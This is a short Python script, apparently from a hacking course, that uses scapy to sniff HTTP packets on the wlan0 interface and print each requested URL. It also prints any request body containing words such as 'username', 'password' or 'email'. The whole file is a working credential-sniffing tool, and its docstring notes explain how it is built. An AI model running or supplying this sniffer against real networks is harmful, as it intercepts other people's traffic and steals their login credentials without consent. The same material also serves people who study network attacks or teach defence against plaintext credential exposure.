#!/usr/bin/env python
'''
COMPATIBLE: python2 and python3
USAGE: prints any urls, usernames, and passwords that are processed by http
    packets must follow through the specified interface

In order to check if a packet has a layer do the following
packet.haslayer(scapy.layername)
Note: scapy does not come with an http filter so we must do the following
packet.haslayer(http.HTTPRequest)

How to access a specific field
packet[scapy.layer].fieldName

Byte (b) to string
b.decode() or str(b)
'''
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)

def get_login_info(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "login", "email", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_sniffed_packet(packet):
    url = get_url(packet)
    login_info = get_login_info(packet)
    if url:
        print("[+] HTTP Request >> " + url)
    if login_info:
        print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("wlan0")
